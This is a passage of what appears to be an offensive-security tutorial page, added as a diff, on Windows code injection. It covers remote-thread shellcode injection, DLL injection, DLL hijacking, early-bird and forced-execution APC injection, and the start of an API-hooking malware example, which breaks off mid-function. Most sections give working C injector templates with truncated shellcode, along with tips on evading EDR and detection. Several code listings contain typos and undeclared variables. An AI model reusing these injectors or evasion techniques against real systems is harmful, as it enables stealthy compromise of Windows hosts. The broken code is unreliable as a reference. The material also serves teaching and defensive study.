+"\xfc\x48\x83\xe4..."
+[...trunc...]
+"...\xda\xff\xd5";
+
+unsigned int payload_len = sizeof(payload);
+
+int main(int argc, char* argv[]){
+    HANDLE process_handle;
+    HANDLE thread_handle;
+    PVOID remote_buffer;
+
+    // Opens the process with the PID given as the first command line argument
+    process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
+
+    remote_buffer = VirtualAllocEx(process_handle, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    WriteProcessMemory(process_handle, remote_buffer, payload, payload_length, NULL);
+    remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LP_START_ROUTINE)remote_buffer, NULL, 0, NULL);
+
+    CloseHandle(process_handle);
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>CloseHandle</code>: A crucial Windows API function used to decrement the reference cound of an open kernel object handle. It is essential for:
+<ul>
+<li><code>Resource Management</code>: Failing to call <code>CloseHandle</code> can lead to handle leaks. The kernel will keep the object and its memory allocated, which can degrade the stability of the target system over time. This is bad <code>OpSec</code>.</li>
+<li><code>Stealth/Cleanup</code>: A common detection heuristic is to look for processes that hold numerous handles to other processes (especially high-privileged handles). Closing the handles immediately after they are used minimizes the window of time for security products to observe the suspicious state, aiding in cleanup and evasion.</li>
+</ul>
+<pre><code class="language-C">BOOL CloseHandle(
+    [in] HANDLE hObject
+);
+</code></pre>
+Here are the <code>CloseHandle</code> function's parameters:
+<ul>
+<li><code>[in]</code>: A Windows API function signature annotation, known as a <strong>Microsoft Source-Code Annotation Language</strong> (SAL) tag, that indicates a parameter's value is input (Read-only) to a function, and must be initialized before being passed to the function.</li>
+<li><code>hObject</code>: The handle to an open object.</li>
+<li><code>CloseHandle</code> returns <code>TRUE</code> is successful, <code>FALSE</code> upon failure.</li>
+</ul>
+</li>
+</ul>
+<h3 id="integrity-levels-and-the-mic"><a class="header" href="#integrity-levels-and-the-mic">Integrity Levels and the MIC</a></h3>
+<p>When injecting into a process, it is imperative to consider the <strong>Integrity Level</strong> the process holds. <strong>Mandatory Integrity Control</strong> (MIC) is a core security mechanism in Windows that controls how processes can interact with each other and with system objects. It serves as an additional layer of defense that can be broken into two parts:</p>
+<ul>
+<li><strong>Integrity Level</strong> (IL): Every process and securable object (i.e., files, registry keys, mutexes, etc.) is assigned an Integrity Level.</li>
+<li><strong>Access Rule</strong> (The Safeguard): <strong>No Write-Up</strong>. A process can only write to objects that have an equal or lower Integrity Level.
+<ul>
+<li><code>Low -&gt; High</code>: A <code>Low_Integrity</code> process cannot write to a <code>Medium_Integrity</code> process (i.e., sandboxed web browser -&gt;! File Explorer).</li>
+<li><code>High -&gt; Medium</code>: A <code>High_Integrity</code> process can write to a <code>Medium_Integrity</code> process.</li>
+</ul>
+</li>
+</ul>
+<p>Each level describes the degree of trust and access a process has:</p>
+<div class="table-wrapper"><table><thead><tr><th>Integrity Level (IL)</th><th>User/Process Type</th><th>Context and Security Implication</th></tr></thead><tbody>
+<tr><td>System</td><td>SYSTEM</td><td>The highest level, reserved for core OS services. Highly protected and highly capable</td></tr>
+<tr><td>High</td><td>Administrator (Elevated)</td><td>Used when a user clicks <code>Yes</code> to a <strong>User Account Control</strong> (UAC) prompt. Full admin privileges</td></tr>
+<tr><td>Medium</td><td>Standard User/Administrator (non-elevated)</td><td>Default level for most user applications, even when launched by an administrator without UAC elevation</td></tr>
+<tr><td>Low</td><td>Restricted/sandboxed</td><td>Reserved for highly vulnerable processes. Protects the system from unwanted changes.</td></tr>
+</tbody></table>
+</div>
+<h3 id="dll-injection"><a class="header" href="#dll-injection">DLL Injection</a></h3>
+<p>Traditional <strong>DLL Injection</strong> involves injecting a Dynamic Link Library into the address space of a process, giving the attacker control over the process's execution:</p>
+<pre><code class="language-C">//evil_dll_1.c
+
+#include &lt;windows.h&gt;
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved){
+    switch(nReason){
+    case DLL_PROCESS_ATTACH:
+        MessageBox(
+        NULL,
+        "You Have Been Hacked!",
+        "&gt;:-)",
+        MB_OK
+        );
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    }
+    return TRUE;
+}
+</code></pre>
+<p>The code within <code>DLLMain</code> is executed immediately following DLL memory loading (after running <code>LdrpRunInitializeRoutines</code>), providing a simple means of executing code within the context of another process.</p>
+<p>After the malicious DLL is crafted and downloaded on the target system, an injector is crafted that will copy this DLL into the memory space of a given process:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+
+char dllPath[] = "C:\\Users\\Administrator\\Downloads\\evil.dll";
+unsigned int dll_len = sizeof(dllPath) + 1;
+
+int main(int argc, char* arvg[]){
+    HMODULE hThread;
+    HMODULE hProcess;
+    PVOID remote_buffer;
+
+    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
+    VOID *lpbuffer = GetProcAddress(hKernel32, "LoadLibraryA");
+
+    if(atoi(argv[1]) == 0){
+        return -1;
+    }
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
+    remote_buffer = VirtualAllocEx(hProcess, NULL, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, remote_buffer, dllPath, dll_len, NULL);
+    remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)lpbuffer, remote_buffer, 0, NULL);
+    CloseHandle(hProcess);
+
+    return 0;
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li>
+<p><code>GetModuleHandle</code>: A Windows API function used to retrieve a handle to a loaded module (typically a DLL or the executable itself) in the current process's virtual address space.</p>
+<pre><code class="language-C">HMODULE GetModuleHandleW(
+    [in, optional] LPCWSTR lpModuleName
+);
+</code></pre>
+<ul>
+<li>Here is a breakdown of the <code>GetModuleHandleW</code> function's parameters:
+<ul>
+<li><code>lpModuleName</code>: A pointer to the name of the loaded module (<code>.dll</code> or <code>.exe</code>) you want the handle for.
+<ul>
+<li><strong>NOTE</strong>: <code>LPCWSTR</code> = <strong>Long Pointer Constant Wide-Character String</strong></li>
+</ul>
+</li>
+<li><code>GetModuleHandleW</code> returns a <strong>handle</strong>, i.e., the starting address where the module is loaded in the current process's memory, to the specified module if successful. If it fails, it returns <code>NULL</code>.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><code>GetProcAddress</code>: A fundamental Windows API function used to retrieve the memory address of an exported function (or variable) from a loaded DLL.</p>
+<pre><code class="language-C">FARPROC GetProcAddress(
+    [in] HMODULE hModule,
+    [in] LPCSTR lpProcName
+);
+</code></pre>
+<ul>
+<li>Here is the <code>GetProcAddress</code> function's parameters:
+<ul>
+<li><code>hModule</code>: A handle to the DLL module that contains the function that you want to retrieve. Represents the base address where the process's memory holds the DLL.</li>
+<li><code>lpProcName</code>: The name of the exported function as a <code>NULL</code>-terminated string or the function's <strong>ordinal value</strong> (the integer index within the DLL's export table, which ust be known beforehand).
+<ul>
+<li><code>GetProcAddress</code> returns a <code>FARPROC</code> object on success. <code>NULL</code> upon failure.
+<ul>
+<li><code>FARPROC</code>: a fundamental Windows API data type defined as a generic pointer to a function, meant to hold the memory address of any exported function from a DLL, regardless of the function's actual return type, parameters, or calling convention. It is defined in <code>&lt;windows.h&gt;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="dynamic-api-resolution"><a class="header" href="#dynamic-api-resolution">Dynamic API Resolution</a></h4>
+<p>The API sequence previously used (i.e., <code>GetModuleHandle</code> -&gt; <code>GetProcAddress</code>) is an example of <strong>Dynamic API resolution</strong>, a technique used by malware to obfuscate its functionality. In modern Windows, Dynamic API resolution can be mitigated with <strong>Control Flow Guard</strong>. Control Flow Guard is a security features in Microsoft Windows designed to mitigate memory corruption vulnerabilities by enforcing tight restrictions on indirect control-flow transfers. It works by verifying that the target address of any indirect function call (i.e., calls made through a function pointer) is a pre-determined, valid function entry point, thus making it significantly harder for an attacker to hijack a program's execution flow.</p>
+<h3 id="dll-hijacking"><a class="header" href="#dll-hijacking">DLL Hijacking</a></h3>
+<p><strong>Hijacking</strong> is the action of taking over (something) and using it for a different purpose. <strong>DLL Hijacking</strong> (i.e., <strong>DLL Preloading Attack</strong>) is a technique that exploits the way the Windows operating system searches for and loads a Dynamic Link Library (DLL) file required by a legitimate application. It leverages the <strong>DLL Search Order</strong> used by Windows when an application calls a function like <code>LoadLibrary</code> without specifying a fully qualified trusted file path (i.e., calling <code>malicious.dll</code>, rather than <code>C:\Windows\System32\malicious.dll</code>).</p>
+<p><code>Load Library</code> is the primary Windows API call used to map a specified module (usually a DLL) into the address space of the calling process. It has several variations, including <code>LoadLibraryA</code>, <code>LoadLibraryW</code>, <code>LoadLibraryExA</code>, and <code>LoadLibraryExW</code>, but the most basic and common form, <code>LoadLibrary</code> takes a single parameters:</p>
+<pre><code class="language-C">HMODULE LoadLibrary(
+    [in] LPCSTR lpLibFileName
+);
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>lpLibFileName</code>: A <code>NULL</code>-terminated string that specifies the name of the module (DLL) to load. If a full path is specified (i.e., <code>C:\Windows\System32\kernel32.dll</code>), the function attempts to load the DLL directly from that path. This is the secure way for applications to load DLLs. If only a module name is specified (i.e., <code>kernel32.dll</code>), the function initiates the <strong>DLL Search Order</strong> process, which is the mechanism exploited by <strong>DLL Hijacking</strong>.</li>
+</ul>
+<div id="admonition-note-3" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-3-title">
+<div class="admonition-title">
+<div id="admonition-note-3-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-3"></a>
+</div>
+<div>
+<p><strong>The DLL Search Order</strong>
+When a relative module path is given, a function will search for the appropriate DLL in the following order:</p>
+<ol>
+<li>DLLs already loaded in memory</li>
+<li>Known DLLs (registry key <code>HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls</code>)</li>
+<li>Application's directory</li>
+<li><code>C:\Windows\System32</code></li>
+<li><code>C:\Windows\System</code></li>
+<li><code>C:\Windows</code></li>
+<li>Current Directory</li>
+<li>Directories in the system <code>PATH</code> environment variable</li>
+<li>Directories in the user <code>PATH</code> environment variable.</li>
+</ol>
+</div>
+</div>
+<p>The <code>LoadLibraryEx</code> version is more advanced, and contains additional parameters:</p>
+<pre><code class="language-C">HMODULE LoadLibraryEx(
+    [in] LPCSTR lpLibFileName,
+    [in] HANDLE hFile,
+    [in] DWORD dwFlags
+);
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>lpLibFileName</code>: Same as <code>LoadLibrary</code></li>
+<li><code>hFile</code>: A legacy parameter, formerly used to allow a process to load a DLL based on an existing file stream or handle, but in a modern context is set to a <code>NULL</code> value.</li>
+<li><code>dwFlags</code>: Control flags that govern the loading process. These flags are critical for stealth and security.
+<ul>
+<li><code>DONT_RESOLVE_DLL_REFERENCES</code> (0x00000001): Loads the module but does not execute its <code>DllMain</code> function or resolve its imported function.</li>
+<li><code>LOAD_WITH_ALTERED_SEARCH_PATH</code> (0x00000008): Changes the search order to begin in the directory of the module being loaded.</li>
+<li><code>LOAD_IGNORE_CODE_AUTHZ_LEVEL</code> (0x00000010): Bypasses some signature validation checks.</li>
+<li><code>LoadLibraryEx</code> returns an <code>HMODULE</code> on success, <code>NULL</code> if it fails.</li>
+</ul>
+</li>
+</ul>
+<div id="admonition-note-4" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-4-title">
+<div class="admonition-title">
+<div id="admonition-note-4-title">
+<p>Note</p>
+</div>
+<a class="admonition-anchor-link" href="#admonition-note-4"></a>
+</div>
+<div>
+<p><strong>How it Works</strong>: <em>Dll Hijacking</em>
+<strong>Dll Hijacking</strong> is pretty basic in practice, being broken into 3 distinct steps:</p>
+<ol>
+<li><strong>Identify the Vulnerable Application</strong>: The attacker identifies a legitimate application (often a signed system utility or a third-party tool) that attempts to load a DLL using an insecure method.</li>
+<li><strong>Exploiting the Search Order</strong>: When the application starts, Windows begins searching a defined sequence of directories for the missing DLL, which often includes locations that a low-privileged user may have write access to, such as:
+_ The directory from which the application was loaded
+_ The current working directory * Directories listed in the user's <code>PATH</code> environment variable
+The attacker places a malicious DLL file, renamed to the exact filename of the DLL the application is searching for, into one of these less-secure high priority locations.</li>
+<li><strong>Hijacking</strong>: When the legitimate application runs, the operating system finds the malicious DLL in the high-priority directory first and loads it, executing the attacker's code.</li>
+</ol>
+</div>
+</div>
+<h3 id="apc-injection"><a class="header" href="#apc-injection">APC Injection</a></h3>
+<p><strong>APC Injection</strong> is a stealthy technique used to force a thread in a target process to execute code supplied by the attacker by queuing an <strong>Asynchronous Procedure Call</strong> object to a target threads APC queue. <code>QueueUserAPC</code> is the primary Windows API function used to schedule an APC routine to run within the context of a specified thread.</p>
+<pre><code class="language-C">DWORD QueueUserApc(
+    PAPCFUNC pfnAPC,
+    HANDLE hThread,
+    ULONG_PTR dwData
+);
+</code></pre>
+<p>Here are the <code>QueueUserAPC</code> function's parameters:</p>
+<ul>
+<li><code>pfnAPC</code>: A pointer to the APC function (or shellcode) you want the target thread to execute.</li>
+<li><code>hThread</code>: The handle of the target thread whose APC queue will receive the call, which must have the <code>THREAD_SET_CONTEXT</code> access rights in order to add an item to the thread's APC queue.</li>
+<li><code>dwData</code>: A single, optional, user-specified value that is passed as the only argument to the APC function (<code>pfnAPC</code>) when it executes.</li>
+</ul>
+<p>There are many types of <strong>APC Injection</strong> attack, including:</p>
+<ul>
+<li>
+<p><code>Traditional APC Injection</code> (Remote): An injection attack which avoids creating a new thread by appending the address of some malicious code to the APC queue of an existing, legitimate thread.</p>
+<ul>
+<li><strong>Steps</strong>:
+<ol>
+<li><strong>Allocate/Write</strong>: Allocate memory and write the shellcode into the remote process using <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>.</li>
+<li><strong>Queue</strong>: Queue the shellcode address to a thread in the remote process using <code>QueueUserAPC</code> (or its native equivalent <code>NtQueueApcThread</code>)</li>
+</ol>
+</li>
+<li>The malicious code executes only when the target thread enters an alertable wait state by calling an API like <code>SleepEx</code>, <code>WaitForSingleObjectEx</code>, or <code>MsgWaitForMultipleObjectsEx</code>.</li>
+</ul>
+</li>
+<li>
+<p><code>Early-Bird APC Injection</code>: An APC injection attack which executes code in a newly created process before its legitimate entry point code runs, effectively bypassing early-stage security hooks.</p>
+<ul>
+<li><strong>Steps</strong>:
+<ol>
+<li><strong>Create Suspended Thread</strong>: The injector creates the target process (i.e., <code>notepad.exe</code>) using the <code>CREATE_SUSPENDED</code> flag, so the initial thread does not immediately execute.</li>
+<li><strong>Inject &amp; Queue</strong>: The injector allocates memory, writes the shellcode, and queues the APC (using <code>QueueUserAPC</code>) to the main, suspended thread.</li>
+<li><strong>Resume</strong>: The injector calls <code>ResumeThread</code>. When the thread is resumed, the operating system's kernel dispatcher immediately checks for pending APCs before running the process's normal start function (<code>LdrInitializeThunk</code>), causing the malicious APC to run first.</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p><code>Forced Execution APC</code> (Local Injection): A method of APC injection which guarantees immediate execution of a queued APC within the current thread/process by making direct calls to the Native API, circumventing the need to rely on a high-level API entering a wait state.</p>
+<ul>
+<li><strong>Steps</strong>:
+<ol>
+<li><strong>Queue</strong>: The code queues the APC (using <code>QueueUserAPC</code>) to one of its own threads (using <code>GetCurrentThread()</code>).</li>
+<li><code>Force Execution</code>: Then, it directly calls the internal Windows Native API function ,<code>NtTestAlert</code>, forcing the current thread to immediately check and process its APC queue.</li>
+</ol>
+</li>
+<li>This method bypasses detection logic that looks for the sequence of <code>QueueUserAPC</code> followed by a high-level alertable wait function (<code>SleepEx</code>, etc.). However, the direct manual call to the un-exported <code>NtTestAlert</code> function is often a string indicator of malicious activity for advanced EDRs.</li>
+</ul>
+</li>
+<li>
+<p><code>Implicit APCs</code> (via Callbacks): An APC injection method, which utilizes Asynchronous functions where a callback function is specified. When the I/O or timer operation completes, the Windows kernel queues a kernel-mode APC to the waiting thread, which executes a stub that eventually calls the user-provided function (the malicious payload).</p>
+</li>
+</ul>
+<h4 id="early-bird-apc-injection"><a class="header" href="#early-bird-apc-injection">Early-Bird APC Injection</a></h4>
+<p>An early-bird APC injection creates a suspended process and loads an APC using <code>QueueUserAPC</code>, so that once the thread has resumed execution, it runs the function loaded in the APC queue:</p>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;&gt;
+#include &lt;stdlib.h&gt;
+
+unsigned payload[] =
+"\xfc\x48\x83\xe4..."
+[...trunc...]
+"...\xda\xff\xd5";
+
+int main(){
+    STARTUPINFO startupInfo;
+    PROCESS_INFORMATION processInfo;
+    LPVOID payloadMem;
+    SIZE_T payloadLen = sizeof(payload);
+    LPCWSTR cmd;
+    HANDLE processHandle, threadHandle;
+    NTSTATUS status;
+    ZeroMemory(&amp;startupInfo, sizeof(startupInfo));
+    ZeroMemory(&amp;processInfo, sizeof(processInfo));
+    startupInfo.cb = sizeof(startupInfo);
+
+    CreateProcessA(
+        "C:\\Windows\\System32\\notepad.exe",
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_SUSPENDED,
+        NULL, NULL, &amp;startupInfo, &amp;processInfo
+    );
+
+    WaitForSingleObject(processInfo.hProcess, 50000);
+    processHandle = processInfo.hProcess;
+    threadHandle = processInfo.hThread;
+    payloadMem = VirtualAllocEx(processHandle, NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(processHandle, payloadMem, payload, payloadLen, NULL);
+    PTHREAD_TART_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)payloadMem;
+    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, (ULONG_PTR)NULL);
+    ResumeThread(threadHandle);
+    return 0;
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>ZeroMemory</code>: A macro defined in the Windows headers, used to clear buffers that may contain sensitive data.
+<pre><code class="language-C">VOID ZeroMemory(
+    PVOID Destination,
+    SIZE_T Length
+);
+</code></pre>
+Here is a breakdown of the <code>ZeroMemory</code> function's parameters:
+<ul>
+<li><code>Destination</code>: A pointer to the starting address of the memory block that is to be filled with zeros. The memory block must be allocated and accessible to the calling process.</li>
+<li><code>Length</code>: The number of bytes in the memory block, starting from <code>Destination</code>, that should be set to zero.</li>
+<li><code>ZeroMemory</code> does not return anything.</li>
+</ul>
+</li>
+</ul>
+<h4 id="forced-execution-apc"><a class="header" href="#forced-execution-apc">Forced Execution APC</a></h4>
+<p>Forced Execution APC occurs when a process accesses the memory space of a running process, adds a function to the APC queue, then uses a Native API call to force the execution of the queued function:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+
+using NtTestAlertFunction = NTSTATUS(NTAPI*)();
+
+unsigned char payload[] =
+"\xfc\x48\x83..."
+[...trunc...]
+"...\xda\xff\xd5";
+
+unsigned int payload_len = sizeof(payload);
+
+int main(int argc, char* argv[]){
+	HMODULE ntdllModule = GetModuleHandleA("ntdll");
+	NtTestAlertFunction testAlert = (NtTestAlertFunction)GetProcAddress(ntdllModule, "NtTestAlert");
+
+	LPVOID payload_mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	RtlMoveMemory(payload_mem, payload, payload_len);
+	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)payload_mem;
+	QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
+	testAlert();
+
+	return 0;
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>using</code>: The C++11 type alias syntax, which creates a new, readable type name. This allows the developer to use an alias for a given function call. It is equivalent to using <code>typedef</code>:
+<ul>
+<li><code>using NtTestAlertFunction = NTSTATUS(NTAPI*)();</code> -&gt; <code>typedef NTSTATUS (NTAPI NtTestAlertFunction)();</code>
+<ul>
+<li><code>NTSTATUS</code>: The return type of the function. <code>NTSTATUS</code> is the standard data type used by the Native API (<code>ntdll.dll</code>) to indicate success or failure.</li>
+<li><code>(NTAPI*)</code>: Specifies that <code>NtTestAlertFunction</code> will be a pointer variable capable of holding the memory address of the actual <code>NtTestAlert</code> function. Used to declare the variable as a pointer to a function <code>(*)</code> that uses the NTAPI (<code>__stdcall</code>) calling convention.</li>
+<li><code>()</code> Indicates the function's parameters. An empty set signifies no arguments passed.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="api-hooking"><a class="header" href="#api-hooking">API Hooking</a></h3>
+<p><strong>API Hooking</strong> is a method used to manipulate and alter the functionality and sequence of API calls. It works by diverting a function call from its original, intended destination to a custom, user-supplied function (the "hook"). It can generally be reduced to 3 steps:</p>
+<ol>
+<li><strong>Identification</strong>: The program identifies a target API function to intercept (ie., <code>CreateFileA</code>, <code>LoadLibraryA</code>, <code>Send</code>).</li>
+<li><strong>Redirection</strong>: The memory at the beginning of the target function is modified (patched) to contain an instruction (often a <code>JMP</code> or <code>CALL</code>) that redirects execution from the attackers custom function.</li>
+<li><strong>Custom Execution</strong>: The custom function runs, inspects the parameters, modifies data, performs logging or executes its own payload. Then it typically does one of two things:
+<ul>
+<li><strong>Calls the original function</strong>: Executes the original, un-hooked code and returns the result.</li>
+<li><strong>Blocks the call</strong>: Skips the original function entirely and returns a custom error or success code.</li>
+</ul>
+</li>
+</ol>
+<p>API Hooking can be employed by legitimate programs. <strong>Endpoint Detection and Response</strong> (EDR) systems and antivirus software monitor sensitive API calls (like disk access, network connections, or process creation) for signs of malicious behavior. Debuggers and profiling tools (like <code>Wireshark</code> &amp; <code>API Monitor</code>) log every function call and its parameters for analysis and troubleshooting. You may also come across <strong>Compatibility Shims</strong>, which are a feature that allows older software to run on newer operating systems by intercepting an outdated function call and redirecting it to a newer, compatible function.</p>
+<p>On the other hand, API hooking is used for many malicious purposes as well. Primarily, it is used as an anti-analysis technique. For instance, consider a malware sample that hooks functions like <code>IsDebuggerPresent</code> and <code>OutputDebugString</code> to return a false result. EDR and other automated sandbox systems analyze the behavior a program demonstrates when attempting to identify malware. If the sandboxed program crashes or loops, it is assumed the program in question is malicious. By forcing the API call to return false, these detection schemes can be fooled. Other methods are used to determine if the malware is actually being reverse-engineered (i.e., checking kernel data structures manually, obscuring how much time passes between actions, and looking for signs of virtual environments).</p>
+<p>Let's consider the following example:</p>
+<ul>
+<li>
+<p>Given some DLL:</p>
+<pre><code class="language-C">entertainment.c
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved){
+    switch(dwReasonForCall){
+    case DLL_PROCESS_ATTACH:
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    }
+}
+
+extern "C" {
+    __declspec(dllexport) int _cdecl Movie(LPCSTR message){
+        MessageBox(NULL, message, "l&gt;[-]", MB_OK);        // camera
+        return 1;
+    }
+}
+
+extern "C" {
+    __declspec(dllexport) int _cdecl Song(LPCSTR message){
+        MessageBox(NULL, message, "OO=[]:", MB_OK);        // guitar
+        return 1;
+    }
+}
+
+extern "C" {
+    __declspec(dllexport) int _cdecl Show(LPCSTR message){
+        MessageBox(NULL, message, "l&gt;[-]", MB_OK);    // camera
+        return 1;
+    }
+}
+
+extern "C"{
+    __declspec(dllexport) int _cdecl Game(LPCSTR message){
+        MessageBox(NULL, message, "&lt;-,-&gt;,A,B", MB_OK);
+        return 1;
+    }
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>extern "C" {...}</code>: A C++ linkage specification that tells the C++ compiler to compile the enclosed code using C-style linkage conventions instead of C++ name mangling. This is done because C++ compilers typically mangle function names to support features like function overloading and when a DLL exports a function, the calling application (which may be written in <code>C</code>, <code>C#</code>, or another language) needs to find the exact, unmangled function name.</li>
+<li><code>__declspec(dllexport)</code>: A Microsoft specific compiler extension that instructs the linker to export the function from the DLL to ensure that function's name and address are placed into the DLL's <strong>Export Address Table</strong> (EAT), making it visible and callable by other executable modules (<code>exe</code> or other DLLs).</li>
+<li><code>int _cdecl Music(LPCSTR message){...}</code>: The function parameter.
+<ul>
+<li><code>LPCSTR</code>: A Windows data type that stands for Long Pointer to a Constant T-String
+<ul>
+<li>A T-String can resolve to either a 16-bit wide character string (LPCWSTR) or an 8-bit ANSI character string (LPCSTR), depending on the project's Unicode settings.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>...</code> (Function Body):
+<ul>
+<li><code>MessageBox(...)</code>: Displays a modal dialog box to the user, which the user must interact with (click a button) before they can continue working in the application's owner window.</li>
+</ul>
+<pre><code class="language-C">int MessageBox(
+    [in, optional] HWND hWnd,
+    [in, optional] LPCSTR lpText,
+    [in, optional] LPCTSTR lpCaption,
+    [in, optional] UINT uType
+);
+</code></pre>
+Here are the <code>MessageBox</code> function's parameters:
+<ul>
+<li><code>HWND hWnd</code>: A handle to the window of the message box. If 'NULL, the message box has no owner and is typically modeless relative to the application's main thread, but will still block the current execution flow.</li>
+<li><code>LPCSTR lpText</code>: The message to be displayed in the dialog box's content area (i.e., the main body of the window)</li>
+<li><code>LPCTSTR lpCaption</code>: The title of the dialog box, displayed in the dialog box's title bar. If <code>NULL</code>, the default title is usually "Error".</li>
+<li><code>UINT uType</code>: A combination of flags that define the contents and behavior of the message box, including the buttons and the icon displayed.
+<ul>
+<li><code>MB_OK</code>: Displays a single <code>OK</code> button.</li>
+<li><code>MB_YESNO</code>: Displays <code>Yes</code> and <code>No</code> buttons</li>
+<li><code>MB_OKCANCEL</code>: Displays <code>OK</code> and <code>Cancel</code> buttons</li>
+<li><code>MB_ABORTRETRYIGNORE</code>: Displays 3 buttons, <code>Abort</code>, <code>Retry</code>, and <code>Ignore</code>. On modern systems, it's recommended to use <code>MB_CANCELTRYCONTINUE</code> instead.</li>
+<li><code>MB_ICONERROR</code>: Displays a critical stop sign (red x)</li>
+<li><code>MB_ICONQUESTION</code>: Displays a question mark icon</li>
+<li><code>MB_ICONINFORMATION</code>: Displays an information icon (Blue <code>i</code>)</li>
+</ul>
+</li>
+<li><code>MessageBox</code> returns an integer value indicating which button the user clicked (i.e., <code>IDOK</code>, <code>IDYES</code>, <code>IDCANCEL</code>, etc.)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Now, to verify that the DLL we created works, we can write a basic program, which includes it and calls the exported functions.</p>
+</li>
+</ul>
+<pre><code class="language-C">// test_hook.c
+#include &lt;windows.h&gt;
+
+typedef int (__cdecl *MovieFunction)(LPCSTR message);
+typedef int (__cdecl *SongFunction)(LPCSTR message);
+
+int main(void){
+    HINSTANCE entDll;
+    MovieFunction movieFunction;
+    SongFunction songFunction;
+    BOOL unloadResult;
+
+    if (entDll != NULL){
+        entDll = LoadLibrary("entertainmentDll.dll");
+        movieFunction = (MovieFunction)GetProcAddress(entDll, "Movie");
+        songFunction = (SongFunction)GetProcAddress(entDll, "Song");
+        if((movieFunction != NULL) &amp;&amp; (songFunction != NULL)){
+            (movieFunction)("Spider-Man: Across the Spider-Verse");
+            (movieFunction)("It's a Disaster");
+            (songFunction)("August 10 by Khruangbin")
+        }
+        unloadResult = FreeLibrary(entDll);
+    }
+    return 0;
+}
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>typedef int (__cdecl MovieFunction)(LPCSTR message);</code>: Creates a new type, named <code>MovieFunction</code>, such that any variable declared with this type will be a pointer to a function.</li>
+<li><code>(MovieFunction)GetProcAddress(entDll, "Movie");</code>: This is an example of <strong>typecasting</strong>, a way to explicitly convert a value or variable from one data type to another.
+<ul>
+<li>The core idea here is that <code>GetProcAddress</code> returns the memory address of a function within the <code>entDll</code> module. Typecasting tells the compiler to treat the unspecific function address returned by <code>GetProcAddress</code> as a specific pointer to a function.</li>
+</ul>
+</li>
+<li><code>(movieFunction)("Spider-Man: Across the Spider-Verse")</code>: The parentheses around the function pointers name is called <strong>implicit dereferencing</strong>. This is optional and can often be used for clarity and to maintain consistency with the proper function pointer syntax: <code>(* movieFunction)("Spider-Man: Across the Spider-Verse")</code></li>
+</ul>
+<p>So, we have our DLL and we know it works. In order to do the actual hooking operation, There are three things that must be accomplished. You must create a piece of malware**, which:</p>
+<ol>
+<li><strong>Loads the identified API into its own address space.</strong></li>
+<li><strong>Contains a function, to hook to which performs the malicious operation.</strong></li>
+<li><strong>Hooks the identified API, by patching a <code>JMP</code> instruction to our malicious function into the targeted API call.</strong></li>
+</ol>
+<p>Here is an example:</p>
+<pre><code class="language-C">// hook.c
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+char OrigBytes[14];
+
+FARPROC hookedFuncAddr;
+
+typedef int (__cdecl OrigMovFunc)(LPCTSTR message);
+
+int __stdcall modMovFunc(LPCSTR message){
+    HINSTANCE entDll;
+    OrigMovFunc origMovFunc;
+    DWORD oldProtect;
+
+    VirtualProtect((LPVOID)hookedFuncAddr, 14, PAGE_READWRITE, &amp;oldProtect);
+    WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookedFuncAddr, origBytes, 14 NULL);
+    VirtualProtect((LPVOID)hookedFuncAddr, 14, oldProtect, &amp;oldProtect);
+
+    FlushInstructionCache(GetCurrentProcess(), (LPVOID)hookedFuncAddr, 14);
